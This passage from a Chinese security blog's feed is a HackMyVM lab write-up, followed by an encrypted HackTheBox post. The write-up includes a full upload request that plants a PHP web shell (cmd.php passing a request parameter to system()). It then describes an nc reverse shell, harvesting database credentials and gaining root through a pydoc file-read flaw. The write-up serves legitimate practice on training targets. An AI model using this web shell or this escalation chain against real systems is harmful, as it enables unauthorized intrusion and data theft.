PHPSESSID=smop95l7ie9o8dn57cv56s1so8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;firstname&quot;</span><br><span class="line"></span><br><span class="line">John</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;lastname&quot;</span><br><span class="line"></span><br><span class="line">Smith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;username&quot;</span><br><span class="line"></span><br><span class="line">jsmith</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;password&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;type&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;cmd.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;x&quot;&gt;</span><br><span class="line">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;x&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;x&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAIGECIQvK5ARxHBh--</span><br></pre></td></tr></table></figure>

<p>发送成功后，头像从原来有张图片到现在加载不出来，在图片那里右键打开图片链接</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102116.png" ></p>
<p>文件上传利用成功，接下来就输入nc反弹一个shell即可</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102209.png" ></p>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102250.png" ></p>
<p>在&#x2F;var&#x2F;www&#x2F;html的目录下找到数据库账号密码，也有看到bella用户，然后就尝试用这个登陆bella，成功</p>
<p>然后sudo -l查到doc可以利用，先执行看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102530.png" ></p>
<p>它打开了本地7890端口，再拿一个shell然后用socat转发端口看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325102829.png" ></p>
<p>看起来是个文件管理系统，看了题解才知道这是pydoc，他是有漏洞的，一个思路是“&#x2F;getfile?key&#x3D;”后面跟上文件名就能读取到想要的文件，就可以&#x2F;getfile?key&#x3D;&#x2F;root&#x2F;root.txt</p>
<p>还有一个思路是在tmp目录下创建一个py文件，然后在见面搜索访问，也能执行我们想要的语句。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104332.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240325104446.png" ></p>
<p>提权成功</p>
<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这个靶机相对简单，也有一定的曲折，最后的pydoc没接触过，值得学习。</p>
<p>doc的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">system(<span class="string">&quot;/usr/bin/pydoc3.9 -p 7890&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-EscapeTwo</title>
    <url>/2025/01/12/htb-EscapeTwo/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d5b2244614aa7ac906cc105543834441f162d03e15562842418402cc9f45ae8e">948d3a4d19e8bce16b53ccf2f5ad6f1a0f2e318246b5c9ffb29f08d8de963c31bdd2ad62902cc2fbdec15237f743025ec151bc60b70797a8d85ca0d1da069aa1181b5f5feb52e1284115f4c0abdc385721fdc0d7cfe064b98af7035f0673a2db872469f52bc000df02aea0e7ef63685b183a6a8072e5e1fb86e3cfd09a155cafa2293869444ab0ad6ac8495f9b5d2bb51dc84aa6e4e9e24c5235ab19b42ebd8b02ee3aec86ebdf1d09756d6941c7a89a3cf890f2e274a77d8f95becc9565ee251eb1693d0072f03559b92b5dc6f530a50d6203307e34476a5623295f5b34da7feeee9088e561f861ec3c2a5b389081eb741e120dcff0f120e0671ac3bce2d3cbd6726190c9eb380e1e24944d45fe97530cab456c33b3faeecddc2841f7e218fa8bd802cc06b603691216d9d02e8ff8467e77423bdc643c3bbac5e4e93c89f61f1ed2cfedb41d626cbfe7a54cd93376b2cc657cc0250d7052df094f13c6c6fd81386a18e256b0669026dc48b195999627b5d921040bf0046889a8560b342bde3a3a989ebfd8fd86adfd2250f5a8b4d740e512e59c8c212a66eda393f085c43619fe34b0ffde6e62225731d28c0440953da99f9420acb56c2679769a83e051ff2560ec74eaa645289adaa36bbdf50207e034261644e28e53a715dbde54839ad10d0178c846a5bae562e02d36362b5c642195ecea76b90faaa1e33d7fc01dfcfd9b6b7129c8f2bfdfc1f7abc15f50d7f5910cd60cfb42b87154d7b2a3e9b2ca33968080b8405d967b36262a37c5d61695d2d9eb0643a6482a612f7cf4f89a9c9b4a5ae3988df01e6494432dc2e1ab1c9e1cf496f965eb2ad0be96ec935fc1410373df84c566c10b069739255442d3021e9dcb61c001de510ace2e3a6e0634267fc2a68b1a6a0444a9bcb2a101a994f68207a48256129a6c53b2dae86b60bfae854f6fac818471671cc3fcf962696fc9c8de6254c057e246d7eaebe69d14569db6a01cf220ec2d02405bd79845d564a0b4cbadcf611fddb8f8765c0b1f84aa7902b85d8cb6d9c064e0731601f8bf9fcf341b3d77df4151f7c21b17a6190795784467c662a570d4bf00d7872e1bf9339212c4ec4a80d125895798f178e7955f8fdc8593d4e46b5389a3d386cd0d65526d45712a0d2c9e142a198ee37414502d22aed4938d2aef7dcc2f6a18d6852a05834b3c2bf9ba41bff030e4014e6b89adb32bfa0697e55a7adf53dfd3dfdb21aa4228c629f91aa68e96b14bfa495a70aee373b30a991569add3eb875a932dbafaa0ab2fd98afbe4b0851de86d59b7c03ecace023c3e5672ee0aaf83ea63fe875727bab0e4d86a9a711bd2ed82c6754755ac65bddecfe3fac105910ed931b9108d045fe2e0d5b6c0ff3b5e43b96bd1c91d5ac2be194bcf7190e1007a461d8c667e8f322aa77df6dbf007caba73d8884177a75172e2e19a9ab6f73bebca91d84d8c4e4c6b0b9b690496d1b33dc1b33e27cdb802d90632b969e2199cad9d4b72cc66c471c6e7852cf1202c5c2e472035fd9f035a5f6f4dfd7b0e3ed94903e0cf61e0936afcec3c177bca61a390b9ee116faaaaeea298a286dcbd98f3322c2bad43296705d7f4bb23f645874313ab7440f9e174643c1691a6fc233a66a1f896f48e55ac18121ced156c71f7b338457968cf74679278a45b35278877bb00d0b0dc9820814701df1104bace1edde25b9ba73544ae5f56ea12cf5b1b0040db0b7d9ea434355f03612b0d51cd1bf615b8bd99bd4f11e5744346a97286140064d63396836df384891e9658f87510016c04ee18fb9c8a2a19cc99754ea2152b0f6fad925f8526315b22395f4aaea1534e43107389faa21b0b8fe700a730a7307f62d103bffd08a85fd43eb7fe1bb39a8dc5d10f7166fa33da0e65ae5f15287e092a10b309e114abc496e8e4b2f5921bcd7714747ab1194899386d198782074135c161a0193e59c2450aed510f9803b115bea32adb9c05ba75459d46c9a6f57f41c83ec0fde5f5f09d1994c166b7d27b81152ffa4f8711e101b7c89fc2bf269cf4f137e61aef1764a4d35e02d6a1f6dc6eff8ba2535630bc1b69dd6a20715c260f152c12febedaf0228bfdee58037e9b978d6045326cefe274fe11f5df478916681c3c072b396cc54f784d685d20f248eed35a760dc53c37a7efb4541d73f55aa6ab2c25f2fda3099ae45bed2d560a5cbfd5b2ff19a7451acb30425fb326f5942b1b4919781715849387ffd5c357dce28f73b9286a44e95db750fc429d6c77a707214b5f94b16e0d765c1455311131905331586f282931242714b8224c9a4a99ef0a1f245672cffeab1b637322fa3d195f063f483293f8c43f0518e98ca561ce77faffbd77ba6359a6cad0be1c0255f7aab8d0073b841ec93e0fb0c107f14a346d76b9cec4a1861f6b4fc0d3ae173e3d91eb0af22ea3add4f30715ee07072b6541090e04a60612e01fe49ef6e9579e26b290d125adb37be4ea94194a3f04ad443b0c266a66a33a21083069a8670fc8caab95eb4b9c5eda52cfb7a2fe398fbea833e947c371dc2712f4e74a712fc33bfab0b881f65fd1ec8c3a9c9edd5ce3a3c916ca077aeecfa88c3f83b03bf2d4abee7d179f6897162c7159a847ff3b3ef23be9016b28771ee8b0bd3eca7a752a883904026c842eac972c0592a7a372a2a0f6cb8fd255a4564e9620ba18bcc51eec4a5dcb89636ff4e1ec99fa7b599c4fbe8eb45f0721a68c2c0f342e52b6627aa78c780e38123c451028ee9d92e732f8dfad671cbc89f0e52fb2f8d7c727e2fa1378082566eb714792f467801cca9a6354e41bb7fc8f931f48a49e51ee6ecb41da2cf8ae4bb39fea45b6ffbb3fc6393b549d04c5d97cc3fec0766163aa189d0e512a9cd559ac2c8c44f4505a784125a610060631ca5a9d44bf6684073244ae9c4c97c278e26c4b0c4b8127782c5d6e274f3ecd6ecad0addfee3ec291de28b34838a8bd6b0bddbbbfd28518987279caee4b6878d17fb1300cf77355ebba0f2faa3dac0710018c90f3e229a2c3151645eaeba3df780950fe6bdccb0b383f304e81073382aa38343e608c7ea45a08a9bb5c38f68623889edd0386d6f910efe3489cb57dc25c1a4cef3de66fb5ad469f26e22daf0c9a8e745d96e37999158a42362be7e514305d4367a7626f90cf0ba9bc2093e5aeef72601659d69d636cc421f3d2407024742fb8bfec5250906d0cda1523eaf28cb6e00539e68260f34990c0967ae52903ef9377235f303483c43a181747e42002e3dacca1772d71bd64ebbb8b6c3f6bd67eced3545a8e06105fe3f417b51dd5f2b3e8281c846d6866d2bd3e84eefcb55d7e83a08981cad776b70026ac4237bff52a57fe2c1cf3febd2ed50a9436e901d5f831c8fe7134e890ae42c035ac996b4eb9bf73feb9860d06aeabb76fd70a84207df30e590faccbb537eb3cae17470a0519ce1bcd78c8c32cde277944bef9fcca95575e63c68dec83df8d1b8f45654d35ff94a8fc88cb81afd9933d337e07d2703c910c14e74746abacf11af65785867a1c24454050e4c483c03611e458b84b3bb916c32cd189518861deaf9f1ca11e26b9fe8743c8a38f1a26f6395bacd19656cd5a5df149bf60cbf101fc8c85af8b95f6e8f646a32ed31cca4d5a671c4173c93af7dd183af89c2780f40ecd2e2313720b765d800326bae48e3279fd59474e8e72fb2f4a6556cc93934e8694030fd58515191a009d26f908d2e6b229884e2dc7d3e556c1e17670984cf2d02209d0cb42e6af122553767d095d316abf4e0918b051c58a1d7824547ba366fd083d09b4a88006c0bee718927e71e598cfa53a344ce87eeb4387f133a8e36ffda805f44605a83cced469f0feec122fe6a3ceccb89e651d123158a9b843bac3ff645925e055586c88f345622cada86699af7025560f0bdb702949942d9abbcbc9af1af9551a3b9c249cbdb59609ebc0cbcc54794999e4e52b36a1e15cc6647961163af52ff63e64cd3db681b869f9a7cda82cc16b777cb3b531bc4c085ab4266043de98f818630988db0bdb2c19ded8b5f8b4f21ddf8dad9b81ac6aacdb0e18424ae9ff51d5f40fd05a2bd437a92da8d30133935003ad669cff724427c3478e11064195489f9254eeb674078854a9d68852502debabc9746ccd56e5bdf8bc2ab7dff7a9f430f0aa67d6337ab82e09bd7aadb7d69c8f4e922fc1eaeb1a6c02b4948ca525e97c5c562c42ee0bb3f34e7520a0b190efcb38a5ff3937baea4b411daadad7828504abeaef380625fcc498c733aef884465b9d7ff0efcb3f90bb5c29329b1cc23866bd09872714850df68d1aec2ea21707f52902f6540dce9ffe33edfa263ebffe3b0dbc05e8f0f95f2fea05e66374eabc976e1751efaf3fed0d28d3804b4280d03d3d52ad93cf8e2dd0256f6a8061f1c22f19729160a846a1da5a5bc40efb145d5955a32fc0fe5bebe3379a2f9cfc13bcb4fa658de8409e4485acce7452fd2712fed552db6640e99d879c29a8b3161562ee0752fdbc603d3fcf4d387f03e4fd9bde4e8fd40de968af5dfd68dc1e9d9d68328b8a6ecb211f72362ce50bedb3942db1d53eb1a19e073eea92d1b2145b81e9d7e571938f0b48e7019c0a344012b463e1353de63bada38fbf436084a5a41a9ba712070bae8f02947f204a075740495ba582e1a2355ec9a97b14674b81c1b4470c80b5889f40f496ca66f706dbe0706be0ecd837470c677553a7d36e7f91e4d1a716d55acbe7ec1bfd0ab13876fee20014e79b9f29da20335ce2bc275859296373c02bfdb78569dcfd4d371faf823d3e9d812016c85006431ccc4fd91c01e72adcb297f516592119468a39f55a1cbc01f9886903e3046caff6d7267c62edb61f31955d9b6f87b95f0d5ad849ba8be504ce8740a5e0a71dc3fea3f5bc3a4ba03d613d47d80ffcc9a9bdd3d89531517980203658bf3464832d701fd667f9feb4a96c1090ba78a4a1ab5d72b832b8a51510814347ac3238a63029ba2d54418c664abe6814c547851f5ba0f1784932d93fe1b442df54ce471c396e021b4603d50be345e0f084f65a547346dc0b6af2041fc45600ba47497c0ea1e06ce98fd73c10696aed241a14f41ccb99b2794b2aec764c4306ebed1e3adb2bc118593647432afa890b3d51ef70f7ac16a0369b0e6d4f68392edef03bbdfa598fae55f5705a732294abc8f3a7b6db555f0a4283037fce880966f1c7ccdddcbf4e23e0bf97b4ff0f6aa1870d00654a5c65c16142c46415c676240874ea840096c60cb9303c7480d547cc5f6d7216283ecef7143abdda9ddbe789d701463b9b7b0b941b110b221ac3a104a8f21867aa70b92e34365d4eb9a5433a6f48feaacccd66ef2cc2545bd89ef0b70a847db4bf437c5138b56a2188dfa8c5af0eaa3959d5a1236d64dba71cc3c619a72263d94aafaffcc6437fb4fa13898ad2ec105715cfd8b93965ff987de30b31e3a81dd25bbbebbd871fd8914dfcc2f34dca961331601d2aec7239fc22155076023828688b2cf9ff2a7677d1566a6645d83b83088e6076b536e5544a4dd000f5c579ae1bf7a3b9c6c51b45830d0793282d030b525aa978c9e037eaeefcb063d45a7ad96c804915dc3eb52ad9daab48d9724cfc46ad4404f3bdf6678e4dcbcc381e9ee3d12442a7fd67c5843d6bb35f01e7fcf49104398d73ecf217ccedc687d70501431bb3bea17dc7b236f485ab386a72c572c27f5d7700e965ef9ce9d7a4d729c1135dd17d8baec23788052ce908aa6a1c5ef17f84d057c52eafafe0ffcc418410973e4cceb7dd7f1bbc6710b9d8487bb4de3ea2d9b6c87581adb51a07640db947c007b09c42bfb9d6cc98cb028bf8fb81b9ad721f8cee0ffdbc81aebe80b4334e0a4fcaaea7445c3f54936e7de3c0fb10266a9c01acd1d0808832783fda62c2012e77e6392cb82418e87cf3a37902481bdc644638b11942a91e8e183b273c1af45201daa9a06bf285d84bd54dd74259325c161a386994c9f7ebd40b5bdf96a7c4e797babb210b2cb050d945ed3e096d989ee6633469b18b4381ea1ed0670b5fba07816a40546f139e3252a16df581bd23c28bcb8deb4f910ac9bcaabbde0a6c87a30b3d259c489f96e5f184f5d372d7f571f63a5101ed4215a7e4faa0aab8b72b650d191281110269cd05ff50233102e4b0d41d4e24508f0d8f4c8d5fae5b7b2bfc31b1299d8af64ea037f4cfe7d05d96a6436d93e7e397b4be0070026497db1185593f5428ef8fa5065dd53009f055da8989e2447b1caaf856ee9b1c72f88edc3c15b4bff85900a141ecd5cba78f27eae9a8a39ea167897ccf777869fb0765b619a5fb3f96c8ccb71939d88438740034c770d3acf3e0c4c01436f2b91d59d9689155f9ad726cde4edd012ecda37049b35998592ff549ed7cb26f6284e3bfc9f8408f490abb8a428912fad76d293f50049c15a57125d714b337db88fd0d00407500786602e67a6f925774b1571a29621c7cd48cfc369f538184d188110812e2e0c3e3454719574b7dac8ea682c66325ddf1390d8b67fffa4457b5f6cdb9b2a714c96e004668cfe4aaa467946dfebc906bec9d39eed46c08bca225b98b878453e418796fa49811e6f700a140c24397a86ead670e1a843db3ce6b1340a5c6fe039d56a5c3f1e68c2b46b8be657bc87e5dbfac119772fb8aa5f31f9c67e8136707b69424cb1d7ce2efbfce0c9e1fd4e6537ae235cc1ee56c207fdd7e935a9ab24bccee34924d6d285bd4a09cd491808f8ebdb58f57b008cd90f1f5cc70b4dce800dc7310326169365ba5e9508741354321d9392bc4b0008003bdffe04ef66fe52a4425a6b62843e962a2cadf9c1f76c292d2bf56cd87ee8826c50a06c876bc2eea496a2e3749364185b8b2a6f30628d64f3ae4dc5f57309cfff89bd7dade3498d024718c34ef7ed64195a97ba4e75665fd0578369f1ccc62be75ad3849a16081d1b3f61dee2661f055496bcf59358e74aeff3154aa74bb18fb3ec2e62e701b0c798cd7d567c1cea3598fa091c190b8ad2f7b9f433c2c651561402eb452b9fb5248c02db4a3b16e171f8c34b037e741c09f7bfcc9456bf676284016f39fefc4a90b67f4c98bfb8e82391aba050f5beaf9bb10fe8f8f75150f7e8046e8b1b70e302111d1d7327b0f1d19d013082ef772bf115a5968528398ed035e158a2b1617d1350928307c1947ef99fc1a75616eab6149d787c4c0303ff918690c415209e603bae1225a61cea1d662de7ec105a416aaf90ce8d02ffeb1e9e1f1d2444133c4b5d59a7cd27f2789bbe118826e6f2629bb72a2a1fd2aa9a97ec59ae10d8b9363daf07ce5cab1cfd54d8810f0d06834bea29e4ade4d0bcabcef3eda4026842c57f9286a8959e8aa9be37e9badbffbfe51e23d0fedb3a6d740a1c0a4e641b09c93c8dc107637798d889182d78519a7d68be3cf7b0259b573b16cc29057b84909f36e5fb7429f330ecbb73a1a0d96fd452273cebc5348c957afb1d9e2b962287da8a6217ef49f27c07bfe7f914aee25e2633ad9029984f873fc2dc138dca06606250b711821261393618aa0fb0d072c2f5402ab9bb179a0bbfe7e9e415056bfcc7c77069f24aae25d23bac37fd99cd98fe3f91eb4e151e53ee4bb425bf2e9cf0daa97f3a28cd94cf1852b888430f7fac003dccd1c676d3a91972bfd6f24cadeea61e841626671744a20e7110edc0b9c096426f1bb378f41145c0e07846c4f3762c233991faa7e43a6f2efa817081f98c6013d0f24b41e004f2ca9885297c9d9282774e79fcbcbd76de660b25a3aecae81d154fa146b0f165d057b6612b4a5f69cea704b48549096061b22c625d590ad9ca8aa136065ba55d1f7a52d58b2adb05211067f7565e6de06328b17ece6edb62246f957145c6f17444146e6c7ae05269244682b76677cc3b1735614364c20623d782f0c61c9f811f01af856a46feb28f41b32ddc77ec65e83495f782f3165985074243fdb0e4b996bc699105188ffc93d3f7dac45d294e33d195d376992477d38694bb5d4e1902ea1d6f5f39c108ab8a458c9e0c701f36a5ffc1a31fc44ac566da097dd3ae553b4a23936ec3c0cdf4f520d3d69f7d737abb97802b5cd48bcb35b48de20369bc99d84ee9588f1727b9d6623b6e6bba86dbcdc6f61354bbfa5ec872dcc5a712b1fa823f5353d54f915e01b5ed650d50440afe381df9ac7454ec5e52a848e6e5712547fc4f764d182174ac56441c2f9d29ba0a3c4b71324059293c7ab02a3b81f47f868f7564419f4000e7d04d8ec443050d0beb2fecac68b78e3be893052bab252dbfd364f149d29d380f86d21db9e7031d0963abd336dbc6ac0110f853f2e86147e73282a5833c421aaaf6948626aa60533a46fe2d197992d70758c62970ed0b1901a631004b52e1aa2607dbdfa74af21198cb8daf74d285c6ae9a33d36d9f8b9ea5672b0277679d3e361ab3b71cf239343548d647a211eb299ac78eb96f0782731fd0cb715770d1ea71cd8d59960a613758689a6d5e3b3423042e25ecd129739aec8a719db63890293b86cb4864cf1dc669a4e5e79a7fb18cd4c251b98254da33c9a748ed69832e6a351c4751585e71f6d23ad3e09a20d7a4a69715c44f1b00cc7de7375bd07953444714c11e5a35d7bd5594c2ee2a0ff5c99bee2106c2948de8add494d1518d660c9b6feedeedd527ad7032211a86650589a0eac8653f1875d0f8330fe8439606c93e8512afbb878716f500e8eaaa90d670880fef60b4576db8102835e7881400239fcc3bc7af74f2db5b35e1212b14dff1159adf82b09cdf707273bfd68977baf39c4f665c400784d148cc9391239b5644f91f95f7370ddf9441d9bf2c71e65efa28c3ba2c994be32acd41156f1579b9a942b766851cbc631a3986b7f48a08ca304e46dd64d04168aa769cac49e3270f4cd1630467d860c17484c776d1f1610b21de7ce14dadfd09a57a048d32cc715ecab89ee84a1ba631211a551c42a5684aafaa695e1c7e06924974d557b6e460918a717ac3edd90b0145c10673dfe58ca85638a402f9231864c6f59e33b2db372d445a58e7c44eb9347ba19566c31e1fd96430116c80cf94e77d7ab3ad7231c378d041efc9b2b827d682212091f303055056cedb227b998f8ff0915dda94cbf143d523b181d5ed9918e9a48e6efa89c02103cbad733fbfa968597ea7c7b89dea23b7813cfd7964919f1ed6540705d3a77382f86c63bef5bc5cc86361951d6a88852536ee77165fe8c6b39ef17a0cf0d55a08ecec9f6977e6856ccb75a7b3055183755188e81215dbdeed5e1979cddf6501436fad2d17ed4cdcb5328da19c0f0bba50e9038a97c490c64d30d0386911ec641652642876948f97ae96fc139624514660edf76a7256e56c011d5358b34d011fadbf0ce589fab6d72da31d20ed6edbdc1c89afea27bc05163b3ae2f928be37716b8741470229045eae402a02b1557a2a54d85f0343226855d4790b33650d4fa74f56913346249360e63a5c31b0f849d7110238dc2e6a04df9253cb6b04953e0294b9f02974be810b58588b84a74af093c2eddf358d484f1414a0f3bf16198647117cb37933d9098a76f22ea3ccada89483079dc5f0b46da6495dbc6edde0f4a2c0b368ff290587795e09a21bface43caf56c207533e843dc84f50a14fa5982f57741b9a8de612206daffcbb963ee42f8b58cdc69098ea632c8c1428fb41142026008e1089769ddb77c7667e32bef545712d286b51229d5a4f2c7a3f6843c2937312ce98f85bbfb225fe5bbea409b635e86a1092a7b33d2334d7dee2610b0b05eed5541cce690c2d9a7a7565012331b7438466c8279878452283c88cefd243f9aaa5f4bc085a5e236b373753d772140844f38438091a8219f5d35d085a4fc1b7456294e9fb9a2cd59f1f02ec5ea6a1688c20d637cc9c471c597f7865465476b582b02bb5e1795f4c180d27798425b278a4adab9955f02329372cb6f33aae6fdfb2e6e38ce89e0b4579f3747b5526072d7999a55827292cfa22f17a413c026dea2dd740422a93ffbdcd8e57006ab305762ef3733b6b1785c4cf7b3c2ec3b6ac7ed5b0220d654a52ed38c82c89921b7e7b559c675890ac3fc6a3c6d802ec49d8734d20d95b537d33c0f87f7783762d7457738af1a6eba04eea644c9a9edf77e5a430d46640c27004bac2ce1ee5a8d3e538f2bb1ba5e9873868bf0fc058883368c528866658be6dd71b758f9ab7a61a12d70fb25132dd99108eeca5b388e91d8613c02e839d7013f5ee37011f4409a7ec968b3a82088e8453b42d4d53121f6f6e9e4c4125d9c7ed61a00ffafdb5de47c7d6eb868c0ae0be6abdf3105a3bb41318f589e525908501639cc6a028071e24e85e88caed9a6f7914a7eddf4b8046e2bdd64107a3a51e51db02a1501ce65115b7fba27707ffbf5fdb7ea783ea90eea4e9d0721037bc72c560959a621e7bed1a1af7cbde0e1f749af12e1b294cdf9f64ec5be37f84b0b9aa45d114906662d5095d0bcc3e657b8e01d29bf3161cc59241f8672547752031e7b7efaa0e467144bb15d346916b93fcfe55486c4bfd0e4f8bbdf7c565d63413fd73d7c619d1b8810f264cbaf7db81fb9f7aa5d95c9f141ac7d3e5c58a9f9f5e083113e91867eb0f0527bf0a55f499bb755e4db46d20e2a86b3285b2be465de743715708217de9f5b3ec9c3f8e0b35d789613a0a9dcab8b438a129c8abfc6fc232c63bbe5a3ee9dfb6d474a8102d594e0f80418412f22b60673dd4d3e66f5bfea14ba071364194bd113220ffee3b9da5268830c7ce9ecad7313566cc8715d1463442714de102d2581557ab10a58c2fd69a1d4de4753b957e5586faaa91f59c3b45f2744c54dcb70b41a3511a97d0a61750ccb96811051fa9533ad98d354dd18628136947d306e96481778bc5d45e83de6dca6cae56fb9c012c62f48116397eba0f3e21ad4736cd5e708f73c19a49682a3c8375762531ab4807d77a21b17e6eca4bb54461239d404c359b6946667e489f7ffe44218f6210226ea2fb5fb116aab0a0002ed6cd2d85bf869b98bc417dc52243ba1bba612f620ad5da80491120a8f8fed1ea6c6290700408334996fa0644217a1cf7dba923d131ad906baf38ed7da9403f757fae014251a3ee463029d2c80c4747745b22061f346186bbed3462f10c25bb6b2327c53aaabbf54f3947ed012481ca1d30483aa4cac329a5f4daec85c23ad102fc101410603000b1b30c1f40bd12635c245a66c4d9141a9736586a0f678b8b25b0fadfde0c14fb6d74f8bcfceb4ef4b8aa97e693d1107f653094436dccc12dcd8f3486e4e809772b1ad38ecdf29a8489e7b664e2d094e1128ead23f1af9780057e59a95381001fc3571787573169ba2fcc370a118dbc2dbabbbf0249db61a172bbe1f630fbc104f307a9f2a4458f50e800b446a1d8bbb4ffd71e05c14f362b8cacb92c46b88f771cd152a1d0d049b9f2b75082fa6d848e00c177eccdd3126f57d69c0afc4a61711fd2ddc0e51e358601db7c80048ba51021018718a7c5ab44f5c2219a94aad4350deddc5c334e49220f25ed8e1f624ddbd66d29b3e436c4fd5d805f9cb90d291050c39c0c7d5737eda9a5b8d401417a1a5ebd98bd3be9f798ab7580d95e33074d3fd45ca22d2b67f05e140d08cc5c1af12309841fb4ab8a1e27268ba6f2c456260e94703cb6845d79f9efd350c4cb015ab4113eb76c428913d705969bd55974e74465db8e9a5b06b1b57932512a9b8d7d890cde696daaaa20cb8df9be975a5972215c961e78a20ef42f024a8386f1e93343534fcffc1d43eb460457005b01574707d55b2be5299dc6aca31817cdcba7606f12d158bd22e75e21ab08e7e7670d39dfc346d4148d2c69a4ad77f1e8f0eef47a4aa8f1f5bf0c4738a18ad16133d4fd5c0a30618c14cfa33e4bf84ed2b9b8a83e36ad9933eac8cc4a737a6202f3a71a8404a14b094d3050b41dedab15db0a663e4a79645f2b0b90505df31ce3b600ce3aa09d6304fbf99fd32800f04460a1798b1b8130169307933895691aae1007b95224c68e1a51e6e9ae90708fd81ae53694c2426a344273f2d7336a5bd62e5cb41565a38ee410d0b38ff40199b10d23431faf948fc2f3a8cf01d0d7c4a9d244fb7392fd8859b4852bf15482e5c90353f2c7768e1a80276855483d5b47c914aebc565cd433d454e74bbaccde734be56cb9f4896307f9b7ef19063954570d902849369c8fc94f97d87aee62b70cebdf3cb5d70b8f4bd66ad9af3d3686048e50e8e242f64d814a2f27da445b56129370e86a1651f5236ef0aa0ba0e762a88434e7cb05ccce528838ffb67b8869b3ecf839db62599531eca9c87ec50fe13352aa2e01769e9b456396d17696b60a2c7a3cce5347dcb10f3e8b04504eba440b0849f2701f024dfefde03c0f390308d750a26799bdaf16b6e5fcf4ad6c8b10f020262306458202d9fb9698d1112894d4144d8916689e3771f9ed190ad8133fd3aaa167a95bad0aa9c45f2d3961b868ef263008ede5740f905ef09cda6fd0cb09f4973265edf2a73aff96485f37acf6faf3794bada47b6d4de907c12b6de4e894d1f055cc6e4a3058d1b3e42427dc60a71d08ed6ac6d8f7dd127a2a2bbbe73e7e34966ac608f8fa012b33c53dda4378edffde3436c46409da0f8e08185568103b310eb749281a110b697d377340bb50262a77da7515e2235af0d85a7c8246fd3e6045f76ff45743c5c623ee99aa038738cca6f2d109d838f65c60596da72864bab9e9901faaaf2fe20d4b8a4ba1503de3c03970b3056ab0c13636352abba3f65b3bf1dcf7b3bf9807e1df253c3b809c9967b03aef07de7b4f7faba63716fb9e50d1dd878cd8d3d099a3c1302887166e883bb17aed7b083cfef6644f1d07d5a6d729ee67afcc8cf2ce5c5d126e16e9fc2df8f0fa21a0537c990126db1181b8e6c5cd4ba5d270e863e4637ca91eef45a5117caf38668974c2452bbac9883fdaa4abded0221add88186c68c850d93b9fb7268a2e20d6cdbe3c281c705671a54d31e678bf40a9a3c4920346efa6e5d446b65afbfb1a501ba8e56c214e9f7576d9161580eb320bad5f8b7dab8b3e62ad7b41dbb65431738fb819a7d5237a813ba2c5b4f1373be63731d8ad27a09714d5f334d2ca5b5ac6f4524453356d415f65cfcabb55a0f27c7615f81ecdcdfb34bf5979411e92a720e943ec3d1acafce5f9689b36a2f298f69f969c9ccf252fb692f0310bd148f02a426daeaeb8ba88c604b11285e362d1a0c02bccbddd7a7f35fb6ee1fb801333ec888f16c581181b94590ac2ec5b1aaef2fed2250a393fb30b59dc90865b8a2377810a9f2f8d0aecfec275120d251470754dadd1987d3f43f1de9f5a84548bbd5e7e3331c3a225f2b85e5c3172475bf456e380c8defa2c2f4ff368947a09b0b6969e42a9fa5306542643d4dda9f4db310c22770